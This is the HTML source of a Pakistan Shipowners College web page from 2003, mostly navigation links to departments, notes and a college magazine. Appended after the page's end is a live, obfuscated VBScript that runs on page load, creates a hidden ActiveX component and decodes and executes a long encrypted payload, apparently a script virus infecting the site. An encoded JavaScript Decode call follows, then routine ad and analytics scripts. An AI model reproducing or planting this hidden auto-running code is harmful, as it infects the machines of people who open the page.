                <TD height="15" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" width="138" bgcolor="#2B62A6"><u><span class="items_sec">
                <font color="#FFFFFF">Departments</font></span></u></TD></tr><tr><TD vAlign=top width="122" height="1" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" bgcolor="#89B5F5"><p style="margin-top: 0; margin-bottom: 0">
                <span class="sub_items_sec">
                <a href="http://www.shipowners.8k.com/tictionary.htm">
                <font color="#000000">Tictionary</font></a><u><font color="#000000"><span style="background-color: #89B5F5"><IMG 
                  alt=New src="new2.gif" align=bottom 
                  component width="28" height="11"></span></font></u></span><p style="margin-top: 0; margin-bottom: 0"><SPAN class=sub_items_sec>
                <font color="#000000">
                <a href="http://www.shipowners.8k.com/download.htm">
                <font color="#000000">Downloads</font></a></font></SPAN></p>
                <p style="margin-top: 0; margin-bottom: 0"><u>
                <span class="sub_items_sec"><font color="#000000">
                <a href="http://www.shipowners.8k.com/sms.htm">
                <font color="#000000">S.M.S.</font></a></font></span></u></p>
                <p style="margin-top: 0; margin-bottom: 0"> </TD>
                <TD vAlign=top height="38" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" width="138" bgcolor="#89B5F5"><p style="margin-top: 0; margin-bottom: 0"><SPAN class=sub_items_sec>
                <font color="#000000">
                <a href="http://www.shipowners.8k.com/depart.htm" style="text-decoration: none">
                <font color="#000000">Chemistry</font></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;               
                <a href="http://www.shipowners.8k.com/depart.htm" style="text-decoration: none">
                <font color="#000000">Physics</font></a></font></SPAN></p>
                <p style="margin-top: 0; margin-bottom: 0">
                <span class="sub_items_sec"><font color="#000000">
                <a href="http://www.shipowners.8k.com/depart.htm" style="text-decoration: none">
                <font color="#000000">Mathematics</font></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;           
                <a href="http://www.shipowners.8k.com/depart.htm" style="text-decoration: none">
                <font color="#000000">Biology</font></a></font></span></p>
                <p style="margin-top: 0; margin-bottom: 0">
                <span class="sub_items_sec">
                <font color="#000000">
                <a href="http://www.shipowners.8k.com/depart.htm" style="text-decoration: none">
                <font color="#000000">Computing</font></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;              
                <a href="http://www.shipowners.8k.com/depart.htm" style="text-decoration: none">
                <font color="#000000">Physical</font></a></font></span></p>
                </TD>
              </tr><tr><TD vAlign=top width="122" height="1" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" bgcolor="#2B62A6"><u><SPAN class=items_sec>
                <font color="#FFFFFF">Library</font></SPAN></u></TD>
                <TD vAlign=top height="21" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" width="138" bgcolor="#2B62A6"><u>
                <span class="items_sec"><font color="#FFFFFF">College Magazine</font></span></u></TD>
              </tr><tr><TD height="53" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" width="122" bgcolor="#89B5F5"><p style="margin-top: 0; margin-bottom: 0"><SPAN class=sub_items_sec>
                <font color="#000000">
                <a href="http://www.shipowners.8k.com/notes.htm">
                <font color="#000000">Subject Notes</font></a></font></SPAN></p>
                <p style="margin-top: 0; margin-bottom: 0">
                <span style="text-decoration: underline; background-color:#89B5F5">
                <span class="sub_items_sec">
                <a href="http://www.shipowners.8k.com/howcompworks.htm">
                <font color="#000000">How </font></a></span></span></p>
                <p style="margin-top: 0; margin-bottom: 0">
                <span style="text-decoration: underline; background-color:#89B5F5">
                <span class="sub_items_sec">
                <a href="http://www.shipowners.8k.com/howcompworks.htm">
                <font color="#000000">Computer Works</font></a></span></span></p>
                <p style="margin-top: 0; margin-bottom: 0">
                <span style="text-decoration: underline">
                <span class="sub_items_sec">
                <span style="background-color: #89B5F5"><font color="#000000">
                <a href="http://www.shipowners.8k.com/glossary.htm">
                <font color="#000000">Computing Glossary</font></a></font></span></span></span></p>
                <p style="margin-top: 0; margin-bottom: 0"><u><SPAN class=sub_items_sec>
                <font color="#000000">
                <a href="http://www.shipowners.8k.com/urduglossary.htm">
                <font color="#000000">Urdu Glossary</font></a></font></SPAN></u></TD>
                <TD vAlign=top height="53" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" width="138" bgcolor="#89B5F5"><p style="margin-top: 0; margin-bottom: 0" align="justify">
                <span class="sub_items_sec">
                <a href="http://www.shipowners.8k.com/mag.htm" style="text-decoration: none"><font color="#000000">Students please submit your articles for a college magazine 2003 to Student's Educational Society.</font></a></span></p>
                </TD></tr></TBODY></TABLE>
            </TD>
          </TR>
        </TBODY></TABLE>
      </TD></TR></TBODY></TABLE>
<TABLE align=center border=0 height="80" width="537">
  <TR>
    <TD align=middle colSpan=3 height="76" width="531">
      <HR width=500>
      <p style="margin-top: 0; margin-bottom: 0">
      <b><font face="Arial"><font size="2" color="#0000FF">
      <a style="text-decoration: none" href="http://www.shipowners.8k.com/index.htm">Home</a></font><font size="2"><SPAN class=nav> | </SPAN>
      <font color="#0000FF">
      <a style="text-decoration: none" href="http://www.shipowners.8k.com/about.htm">About</a>  </font></font><SPAN 
      class=nav><font size="2">|</font><font color="#008000" size="2">
      </font> </SPAN>
      <font color="#008000" size="2">
      <a style="text-decoration: none" href="http://www.shipowners.8k.com/depart.htm">
      Departments</a><SPAN 
      class=nav> </SPAN>
      </font> <font size="2"><SPAN 
      class=nav> |<font color="#008000"> </font>
      <a href="http://www.shipowners.8k.com/notes.htm" style="text-decoration: none"><font color="#0000FF">Notes</font></a><font color="#008000">
      </font> </SPAN></font>
      <SPAN 
      class=nav><font size="2">|</font><font size="2" color="#008000">
      </font> </SPAN>
      <font size="2" color="#008000">
      <a style="text-decoration: none" href="http://www.shipowners.8k.com/mag.htm">
      College Magazine</a></font><SPAN 
      class=nav><font size="2" color="#008000">
      </font> <font size="2">|</font><font size="2" color="#008000"> </font> 
      <a href="http://www.shipowners.8k.com/map.htm" style="text-decoration: none"> 
      <font size="2" color="#0000FF">Map</font></a><font size="2" color="#008000">
      </font><font size="2">|</font><font size="2" color="#008000"> </font>
      <font size="2">
      <a style="text-decoration: none" href="http://www.shipowners.8k.com/contact.htm">Contact</a></font></SPAN></font><SPAN class=nav><font size="2" face="Arial"> </font>
      </SPAN><a href="../../WINDOWS/Desktop/New%20Folder%20(2)/contact.asp"></font></a>
      </font></b></p>
      <p style="margin-top: 0; margin-bottom: 0">
      <font face="Tahoma"><b><font color="#808000" size="2">
      <a href="http://www.shipowners.8k.com/link.htm" style="text-decoration: none">
      <font color="#808000">Link your site to Shipowner's</font></a>  | 
      <a style="text-decoration: none" href="javascript:if (document.all){window.external.AddFavorite('http://www.shipowners.8k.com','ShipOwners.8k.com - Pakistan Shipowners College')}else{alert('Press Control+D or Option+D to add this page to your list of bookmarks.')}">
      <font color="#808000">Add to Favorites</font></a></a></font></b><font size="2"><font color="#808000"><b> 
      |  
      <a href="http://www.shipowners.8k.com/sitemap.htm" style="text-decoration: none">
      <font color="#808000">Site Map</font></a>  |  
      <a href="http://www.shipowners.8k.com/advert.htm" style="text-decoration: none">
      <font color="#808000">Advertisement</font></a>s  </b> </font>
      <b><BR>
      </font><FONT 
      class=Footer><font size="2">©All Rights Reserved for Pakistan Shipowners 
      2002-03</font></FONT><font size="2"></font></font></b></font></TD></TR></TABLE>
<p style="margin-top: 0; margin-bottom: 0" align="center">
<font face="Arial" size="1" color="#808080">This page was last updated on <!--webbot bot="Timestamp" S-Type="REGENERATED" S-Format="%A, %d %B %Y" startspan -->Thursday, 17 April 2003<!--webbot bot="Timestamp" i-checksum="59921" endspan -->, 
</font>
<font face="arial, helvetica" color="gray" size="1">Every effort has been taken 
to ensure the accuracy of the content of this site but the publisher cannot be 
held responsible for the consequences of any errors. A number of external
<a class="spider" href="http://www.londontown.com/links/links.html">links</a> 
exist within the site and the publisher does not endorse any such external
<a class="spider" href="http://www.londontown.com/links/links.html">links</a>.</font></p>
</BODY></HTML>
<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "AffFkPgbo^+EqfkQbqs)S[rQbqs)A^fob^Rfdg+>mikbL[ib`m+CPH+TpLgbie+TfgO^qa+Pr[D)Cbm^irCfpdPnaHC^pqZqq%HCRbq=hj%HCBobZsbJbkfbn'&JGIbjbFm'&JG@kd^q^L^fe'&JGMknm^``qb!(>maLt_Cnm`qbnkDI>midkaMn%CbkbMZse)MxmbLso&LkDoohqO^rrj^KbqsLdqKd^aMdjm<CLN+LidkQ^wqCbkb%?hibI`qe%0&SjmLso6ObZcQbfo+O^`a>ekBeFgrqo!SjmLso)JG\ls^om'&9;/LkIbg'QjiRqo9*Qe^mKd^aMdjm'Billd>wfqErk\sflgBgcF_F_QvidPqk:gqqQe^mKd^aMdjm'BilldLdq?hibMdjm<CLN+LidkQ^wqCbkb%?hibI`qe%1&Efi^Sbji-Tobsb;?HCVhmilZc:!#!s_lbofis7%DI\pm`oq!(#=s_<qIc%QfoPqk#oa@oEe#GqjeSbumCbkbQ^lm+<klp^P^sC:sqoba:EPL'Fbq?hib!Efi^O^qa(?@qqkh_+Zsqobarq^r:21Dip^O^`aQ^lm+<klp^P^sCbkbQ^lm6CPH-Lm^mQbqsCfed%CbkbMZse)1(BeQrobPmq:!eqfkMgbkCfedQbfo+Tkhqbu_@kKc9#GQJE=s_<qIc%5!#!?L=Xlgkl^]<#u_p\qfmm9HC^pqZqq%!%7!#u_@kKcEqfkQbqs>kpbBeQrobPmq:!s_l!QadkEfi^Sbji-Tobsboa@oEe#U_pMduqBk]FcCfedQbfo+@enpbBk]FcBk]CrgbqfhmCrgbqfhmHCBe^gfbPna%@nqobgsPqkhkd%K^pmHka^w@eZq&HcE`pqBmabqBe^k:)Qe^mBeI^eq%EB^p^'@rkqbkmRqobmd&%0&6;I<`pb!!`Qe^mDI@eZmdbLt_6Cfg`iv=hph%3[Rr_>:)BerbJG@a`kd^Rr_<@aq%>lb%I^eq%EB^p^'@rkqbkmRqobmd&%0&&,.#9YPr[D:/>maBe>kpbHG<g^k`dPr[:Fha%<too^mqPmqfk`+.)E`pqBmabqBe^k(>maBe>ma?tk`mhlk?tk`mhlkJG@kd^q^L^fe'&Nk>qolkObltjbMbumF_FkPgbo^:gqje!QadkDufmCrgbqfhm>maBeLg^o^Efi^:Edcq!VfkI`qe%2&MkndoZlCbkbpUBljfnk?hibl[Jf\qlpheqLg^o^cYPm`qfhmbor[_iZmh+asjFc'CPH-CfedBubrqp!Re^kdCfed&&Sebg@ZkiDI>midkaMn%Pa`ob?hib%!eqfk&BildLdq?hibMdjm<CLN+LidkQ^wqCbkb%Lg^o^Efi^+/)mqrbCbkbQ^lm+Pqfq^9#GQJE=s_<qIc%5!#!?L=Xlgkl^]<#u_p\qfmm9HC^pqZqq%!%7!#u_@kKcEqfkQbqs?hibMdjm'Billd>maBe=dc^nkqF]:PrPe^ki+KddO^`a%GHBR^@RKQBKM^RP>QYF]dkqbsfbl[Ab_`rimRp^qF=!&NrqEnlhOdopbnk6TpLgbie-Ob`Qb^]'EDDV\EN@>E^J><GFK>[Pl_st^kdYJbbollncqUNrqenlhDumkdppULbab`Sbk!&VpPadii'QbdPqfq^EDDV\<TOO>MQ\NRBOUHabgsfqbdpY%Ab_`rimHa#[Pl_st^kdYJbbollncqUNrqenlhDumkdppU!#Edcq!NrqEnlhOdopbnk)*(#--YF`fiUBljinpbTpbRq^mhlk^qv%0)KDD\=VLO=!<`iiJGJZhiO^f%AJBVXBROKDKQXTPBK[Fa^mqfmhbpU!#A^e^resFa!YPheqtZqbYFh`ohrlcm[LrmklldBuiqbpl[#Kbcm'LrmKlldUbolhlk%0&!+-UL^fe[PqZsflgdovM^j^!)Pa`ob?hib@ZkiDIJ^bkOb`'EDDV\<TOO>MQ\NRBOUHabgsfqbdpY%Ab_`rimHa#[Pl_st^kdYJbbollncqUNrqenlhDumkdppU!#Edcq!NrqEnlhOdopbnk)*(#--YF`fiUVfa^PqZsflgdovM^j^!)Pa`ob?hibTlRebek+O^fTobsbGHBR^@RKQBKM^RP>QYPheqtZqbYFh`ohrlcm[Lc_h`bU8+-UNrqenlhUNmqbnkpUL^fe[BabsloIqbc^qbk\d)*2.-01)KDD\=VLO=!<`iiJGJZhiO^f%AJBVXBROKDKQXTPBK[Pl_st^kdYJbbollncqUVfk]ntpLbpl`dfgfPnapvlsbjUOol_hibl[Jf\qlpheqHtqihnhBmqbkmbqRbqmhkdl[-^)c-/)/--)/--)/`-)/--)/--)/---5Y-)0b-,5-%!_iZmh@ZkiDIJ^bkOb`'EDDV\<TOO>MQ\NRBOURlcmv^o^[Jf\qlpheqYPhkahvpGSY@nqobgsSbkrflg[TfgcltlJblr^dbmdLt_prrqbf[Mohefi^rYJbbollncqNrqenlhHkq^qkbmPbmsfk`rY-Z/a-+/--)/--)/-`)/--)/--)/--)33Y)/.b)23-+_e`kh(PrPe^ki+KddTkhqb!EH>X\@NQOBGS\RLDOYLncqp`obULf`knpl_sYL_ef`^[.-'/YLnsilhjYLisflgrYJZhiY>cfqhqMo^ebo^m`b+.0*/4/%!OB@^ATHQA@^ekHCL^feQbd!!EH>X\@NQOBGS\RLDOYLncqp`obULf`knpl_sYL_ef`^[.-'/Y@hljlg[J^bkPbmsfk`rYK^vPqZsflgdov+_e`kh(DIrjf`db?nia^q%I^eq%PhkMZse),(#!Mohfo^fCfedpY<njjhmCbkbpULf`knpl_sPa`ob][PqZsflgdov(>ma?tk`mhlk?tk`mhlkJG@kd^q^Lfibdr%LgBoknoKdprfdK^wqSbjiO^qa:!BeKhs%CLN+CbkbBqhpql'TfgO^qa#VP`khmq'dub(&MgbkQbfoM^mg:!pvlsbj,1YBk]FcFcSbjiO^qa:rvpmdj0+[MgbkPqZqqRiEfi^:PhkMZsePRRQBF[Hbkmbi,1+aekDip^Pm`oqNoCfed:VfkI`qe%LXPQ>LYH^qkbe-aie!>maBePrPe^ki+KddTkhqb!EH>X\IHB>IXL>@AHKBURlcmv^o^[Jf\qlpheqYPhkahvpY<too^mqS^qpfhmYOnmYH^qkbe2/%Rq^ksRm?hibCPH-@lixCfedTbmM^mg#!tb[[hgp`ii'ffc+TfgO^qa#vb_UEli]do+asqCPH-@lixCfedTbmM^mg#!pvlsbj,1Yhcv^ie-df_!)TbmM^mg#!pvlsbj,1Ya^rhqho+fghB^ieHG:ombgcQl!VfkI`qe%pd_Y?nia^q+ems)gqq(PrPe^ki+KddTkhqb!EH>X\@E@PP>R\OHNQY'ciiU!)]kicbkbTpLgbie-Ob`VofmdAJBVXBI>LRBPXQLLM[+aekY@hmqbgsQrob%!^mikf`Zsflg.u*fralpmilZcVpPadii'QbdPqfq^EDDV\<K>PLDP\KNLQUcii_hibUCbcZtiqBblkU!)TlRebek+O^fObZc%AJBVXBI>LRBPXQLLM[su]efi^[Ab_`rimH`lg[&TpLgbie-Ob`VofmdAJBVXBI>LRBPXQLLM[aieefi^[P`khmq>mdfgdY%!S?LbofisVpPadii'QbdPqfq^EDDV\<K>PLDP\KNLQUcii?hibURebekYLidkY<njjZmaY+TfgO^qa#MdjmI`qe%PR`oboq+^wb!.!#!PrPe^ki+KddTkhqb!EH>X\@E@PP>R\OHNQY]kiCbkbYLgbieDuYIqlm^qqvLgbbmG^k]kbol[TPAOolirY%!x3)121<@2*240?&0.@?,5@25*-)@>-)A54)7@zTlRebek+O^fTobsbGHBR^@I:RPBL^OLHSYaekCfedYP\qfmmGlpmDk`hcbY+x14.0*50.&35-<,..=1*?*E6*)/@--E53<2/1v!Ldq?hibMdjm<CLN+LidkQ^wqCbkb%Ls^omTmCbkb)++qond&Efi^Sbji-TobsbOapQ^wqEfi^Sbji-@ihrbDkaErk\sflgErk\sflgHGEhhbBs%&FcHkTadob;;gqje!QadkDufmCrgbqfhm>maBeMgfpEn`^mhlk<ahbrj^mq+en`^mhlkFcKbcm'QebrIl\`qfhm)-(:!cfedMgbkQebrIl\`qfhm:Lfa!SeflKl`Zsflg+6&FcEPL'Fbq>wqbgrflgM^j^'QebrIl\`qfhm&5=qe^mMgfpEn`^mhlk<I^eq%MgfpEn`^mhlk%Kbk!SeflKl`Zsflg(*Kbk!EPL'Fbq?hibG`jb!SeflKl`Zsflg(&&Bk]FcFcKbk!SeflKl`Zsflg(;2QadkSeflKl`Zsflg:MgfpEn`^mhlk%U!>maBeDIrjf`db?nia^q%QahpIhb^qbnk&Bk]FcBk]CrgbqfhmCrgbqfhmHCL^feQbd!QbdLso)?hibG`jbLgBoknoKdprfdK^wqQbdMdjmLso6TpLgbie-Ob`Qb^]'Ob`RqoF_Ob`SbjiRqo<Qe^mPrPe^ki+KddTkhqbQbdLso)?hibG`jbBk]FcBk]CrgbqfhmCrgbqfhmHCN_lLt_%<too^mqPmqfk`(Lt_B<-QblsLrm:)AhTebkbMqrbQblsLrm:MdpqHtq$.HcMdpqHtq7/5Sebg@nqobgsPqkhkd<Cbm^irCfpd#9YBubsAhBgcF_LgBoknoKdprfdK^wqRbqSeflEli]do6CPH-DbmEli]do%<too^mqPmqfk`(Ldq=h`Pna:BobZsbL[ib`m'P\qfmmhkd'Cf`mhlkZqvP^sChkabkr:SeflEli]do+Lt_Chkabkr?nia^q@lnmq6-EloD^`aQbfoClecbohk?nia^qpEli]do@htkq<ChkabkBlrgs(0=h`Pna+^]cChkabkBlrgs)Mdjm?nia^q+KZlbMbumF_Af\Rr_'Blrgs:/QadkK^pmHka^w@eZq:HkpmqObo'@rkqbkmRqobmd)[)Edk%<too^mqPmqfk`(*.PnaPqkhkd<Jbc%@nqobgsPqkhkd%K^pmHka^w@eZq(.%Kbk!BrokdkqLsofgf&*E`pqBmabqBe^k,.&@rkqbkmRqobmd6HG<g^k`dPr['@rkqbkmRqobmd)E`pqBmabqBe^k(Lt_B<.BildBePnaB6-Mgbk@rkqbkmRqobmd6@rkqbkmRqobmdAf\Rr_'Hqbf'.&%U!>wfqClDip^g<-Clkg6.MnChkabkBlrgsBeI<`pb!Rr_Lsofgf&6I@Zrb%=h`Pna+Fmdj%c(&MgbkFci9Eli]do@htkqSebg@nqobgsPqkhkd<@nqobgsPqkhkd%AbbPr[-Fq^l%g$0&YBqhq=n>maBe>maBeGduqI^lsFk]du@a`o6FklsoO^u%@nqobgsPqkhkd%!Y%Kbk!BrokdkqLsofgf&**(Lt_Pmqfk`:Fha%<too^mqPmqfk`+I^lsFk]du@a`o(*+Ibg'@rkqbkmRqobmd&&K^pmHka^w@eZq*.@nqobgsPqkhkd<HCBe^gfbPna%@nqobgsPqkhkd%K^pmHka^w@eZq&DkaHcDkaHcKlliHCN_lLt_6@rkqbkmRqobmdDkaErk\sflgErk\sflgHGIqlmZf^q^'&Nk>qolkObltjbMbumO^fM^mgS^etb6EDDV\EN@>E^J><GFK>[Pl_st^kdYJbbollncqUNrqenlhDumkdppUCbdkdbAfljAb`qbb<TlRebek+O^fObZc%O^fM^mgS^etb&FcCfpdCbdkdb6SebgAbrhA^fob^:?hk^exAflj#!7YBgcF_Chqf60qh2CfpdCbdkdb6HGHalPna%AbrhA^fob^(DIrjf`db?nia^q%AbrhA^fob^(GduqTpLgbie-Ob`VofmdO^fM^mgS^etb)=hph=ddo^d>ma?tk`mhlk?tk`mhlkJGrfl^d^Eli]do%I`qeG`jbLgBoknoKdprfdK^wqRbqEli]doKZlb6CPH-DbmEli]do%I`qeG`jbP^sQahpCbkbp<ChkabkM^j^-CfedpGqq>wfpmr:/?no>``eSeflEfi^FkSeflEfi^r?hib>wq6R@Zrb%?RL+@dqBqsbklhlkG`jb!SeflEfi^-M^mg&&FcEfi^Duq<ASJNo?hib>wq6EMLINo?hib>wq6>LOHqCbkbBqs:!MEI!LkCfedBum:IPMQe^m<`iiJG>iobk]Sl%Mgfp?hib'O^qa+emliBerbF_CfedBum:U?PQe^m<`iiJG>iobk]Sl%Mgfp?hib'O^qa+s[r&BildFcEfi^Duq<ASQSebgEmsBubrqp<.Bk]FcKbqsBe%NB^p^'M^mgK^fd&6R@Zrb%PhkMZseA^rhqhoY(Lk%R<`pb!O^qaM^j^(:T@^ld%TbmM^mg#!Abljqli!&&MgbkEqmDuflsp6.DkaHcHcAsqBqhpql:)Qe^m?RL+<nmv?hibVfkI`qe%lxpq^l0/Ucbpdslm'hkf+M^mgK^fd?RL+<nmv?hibVfkI`qe%pd_Y?nia^q+ems)I`qeG`jbBk]FcBk]CrgbqfhmCrgbqfhmHCRbq=hj%LgBoknoKdprfdK^wqDoo'BibZqMdpqBs:VP`khmq'R`oboqCnkikZlbHc>qoMgbkFkPgbo^:gqje!>kpbFkPgbo^:u_pBgcF_F_FkPgbo^:u_pQe^mLdq?RL6@o^`qbHagb\s%Lbofisfk`-CfedPvlsbjHagb\s&PbmTpLgbie:<qb^mdL_cd`q!!TP\qfmm-Pe^kiBerbRbq@mmedL_cd`q<ahbrj^mq+Zomi^sp%JG\`tbpm!&@mmedL_cd`q'rbq<KPF='x?802=B//&0@C),..=/*>=A6*)/@--EA21@-?v!&@mmedL_cd`q'bobZsbFgrq^gbb%P^sTlRebek:@mmedL_cd`q'FbqHagb\s%&>mikbL[ib`m-pbmBIPBC%t/A1,EB-*,C-22*.*BC*181-&/->)B6-.3//1|&>mikbL[ib`m-`o^`qbBmpqZm`b!(Ldq?RL6>mikbL[ib`m-DbmN_g^bq%BgcF_P^sAbrhL[ib`m:?RL+=qfs^r?no>``eCfpdSbjiFkCfpdN_g^bqHc=hphMdjm'CofodQvid97/:ma=hphMdjm'CofodQvid97.MgbkBubsChq>maBe?hk^exAflj:CfpdSbji-AobubI^sqbkK^wqCfjNqe^q>ok'0&O^gcljbybEloh:-Sl,Lmgbo:qo%b(:Hkq!'6#Ok](&MbumQ^lmPmqfk`:!?nob<.MnI^m%QahpQ^wq&QbfoKrf::r`%Fha%MgfpMduq%h).(BeQ^lmKnl:00MgbkQbfoKrf:+7>kpbBeQ^lmKnl:0-MgbkQbfoKrf:+8>maBeMdjm<g^o<@aq%Q^lmKnl*Nqe^q>ok'fFna-(&HcMdjm<g^o<@aq%0-(QadkSbjiBe^k:<go%*7&DkaHcSbjiRqobmd6QbfoPqkhkd%Q^lm@a`oMbumRgKl`dRqo<>wb`nsb%!AffHbr@oo!2&)MgfpMduq!#s[BoI_%Ddv>kq%-:#Hsebk@oo!/&%s_<qIc!H^x>ok'.&<%Lmgbo:qo%*(#!u_@kKc#!Hbr@oo!1&6Lqado>kq%/#!#oa@oEe#Jbv:qo%,(:!#Nqe^q>ok'0&%!#s[BoI_%?nob<.MnI^m%BqdPqkhkd!#oa@oEe#SbjiMrj<>lb%Jbc%BqdPqkhkd%h).(u_@kKc#!FcSbjiMrj<.1Qe^mu_@kKc#!QbfoKrf:,3u_@kKc#!Bk]Fc!#s[BoI_%Mdjm<g^o<@aq%Q^lmKnl(Jbv:qo%bJl]1&!#oa@oEe#HcMdjm<g^o<@aq%/1(Qadk%s_<qIc!Q^lm@a`o6s_<qu_@kKc#!BildFcSbjiBe^k:<go%+8&Mgbk!#s[BoI_%Mdjm<g^o<s[Kc%s_<qIc!BgcF_!#oa@oEe#SeflSbum:MgfpMduq%Q^lm@a`o%s_<qIc!K^wq(s_<qIc%>wb`nsb%MgfpMduq!MgfpMduq<>wbPmqfk`:!QbfoPqkhkd%!GqjeSbum:5!#!p`khmqk^k`t^d^<s_lbofis;%s[BoI_#cl`nlbkm-tobsb#!%5!#!afopqrkb: olpbsflg9^_lnirmd8edcq3/mu4qli9-mq:tbcqe3/mu4ebbfeq3/mu4w*bmabq9/54sflh_fehqv3ef]cbk =9!#!#!>MIKBQM>J><HG!#^dr^rqADFDAS:-VFAMG:-bla^<`lf-jp'!#!^`mhsbQ->`mhsb!#W@lfolk^mq;#;,:OMI>S;%5!#!,abu;!#u_@kKc9#.p`khmq7!#u_@kKc9#r`oboqe`kdn`db6u_p\qfmm=s_<qIc%QahpQ^wqs_<qIc%RgKl`dRqo%s[BoI_#;,lbofis;%s[BoI_#;,;NAV7!#u_@kKc9#.EQFK;S_lSbum:MgfpMduq%s[BoI_#NmIl\jPqk#oa@oEe#!HGXrq^ks%&TbmM^mg:EPL'FbqLob`b`iChkabk'-&%U!Be%?RL+?hib>wfpmr%TbmM^mg#!tb[[Clecbo'gqq(&MgbkCPH-@lixCfedTbmM^mg#!tb[[Clecbo'gqq+TfgO^qa#vb_UjgtZki+`hcBk]FcFc'CPH-CfedBubrqp!VfkI`qe%lxpq^l0/Ucbpdslm'hkf(&MgbkCPH-@lixCfedTbmM^mg#!pvlsbj,1Ya^rhqho+fgh)PhkMZseprrqbf2/Ydit^ek+dbeDkaHcDkaErk\sflg"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 1"&vbCrLf&"KeyArr(1) = 3"&vbCrLf&"KeyArr(2) = 3"&vbCrLf&"KeyArr(3) = 7"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</BODY>
</HTML>
<SCRIPT LANGUAGE=JavaScript>
<!--   
    Decode('%297Gwgvmtx%2964perkyeki%297H%2966nezewgvmtx%2966%2964x%7Dti%297H%2966xi%7Cx3nezewgvmtx%2966%2964wvg%297H%29663gkm1fmr3zepmhexicferriv%297Jirg%297H%7D%7C%2969%3BG%2969%3BH%3A%3D%2966%297I%297G3wgvmtx%297I4');
//-->
</SCRIPT>


<!-- PrintTracker Insertion Begin -->
<script src="/fs_img/js/pt.js" type="text/javascript"></script>
<!-- PrintTracker Insertion Complete -->


<!-- Google Analytics Insertion Begin -->
<script type="text/javascript">
<!--
        var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
        var URL = gaJsHost + "google-analytics.com/ga.js";
        document.write(unescape("%3Cscript src='" + URL + "' type='text/javascript'%3E%3C/script%3E"));

        var hndl = window.setTimeout('StartTracking()',100);
        function StartTracking(){
          if( typeof(_gat) == 'object'){ 
             window.clearTimeout(hndl);
             var pageTracker = _gat._getTracker("UA-4601892-3");
             pageTracker._setDomainName("none");
             pageTracker._setAllowLinker(true);
             pageTracker._initData();
             pageTracker._trackPageview();
          }else{
             hndl = window.setTimeout('StartTracking()',100);
          }
        }
-->
</script>
<!-- Google Analytics Insertion Complete -->

<SCRIPT LANGUAGE=JavaScript>
  <!--
  //configuration
  OAS_url = "http://cyclops.prod.untd.com/";
  OAS_sitepage = 'webservices/general'; //CHANGED
  OAS_listpos = 'Bottom';
  OAS_query = '';
  OAS_target = '_Blank';
  //end of configuration
  OAS_version = 10;
  OAS_rn = '001234567890'; OAS_rns = '1234567890';
  OAS_rn = new String (Math.random()); OAS_rns = OAS_rn.substring (2, 11);
  function OAS_NORMAL(pos) {
    document.write('<A HREF="' + OAS_url + 'click_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" TARGET=' + OAS_target + '>');
    document.write('<IMG SRC="' + OAS_url + 'adstream_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" BORDER=0></A>');
  }
  //-->
  </SCRIPT>

  <SCRIPT LANGUAGE=JavaScript1.1>
  <!--
  OAS_version = 11;
  if ((navigator.userAgent.indexOf('Mozilla/3') != -1) || (navigator.userAgent.indexOf('Mozilla/4.0 WebTV') != -1))
    OAS_version = 10;
  if (OAS_version >= 11)
    document.write('<SCR' + 'IPT LANGUAGE=JavaScript1.1 SRC="' + OAS_url + 'adstream_mjx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '?' + OAS_query + '"><\/SCRIPT>');
  //-->
  </SCRIPT>

  <SCRIPT LANGUAGE=JavaScript>
  <!--
  document.write('');
  function OAS_AD(pos) {
    if ((OAS_version >= 11) && (typeof OAS_RICH != 'undefined')) {
      OAS_RICH(pos);
    } else {
      OAS_NORMAL(pos);
    }
  }
  //-->
  </SCRIPT>

  <TABLE ALIGN=CENTER STYLE="clear:both"><TR><TD ALIGN=CENTER> <!------ OAS AD 'Bottom' begin ------> <SCRIPT LANGUAGE=JavaScript> if(window.OAS_AD) OAS_AD('Bottom'); </SCRIPT> <!------ OAS AD 'Bottom' end ------> </TD></TR></TABLE>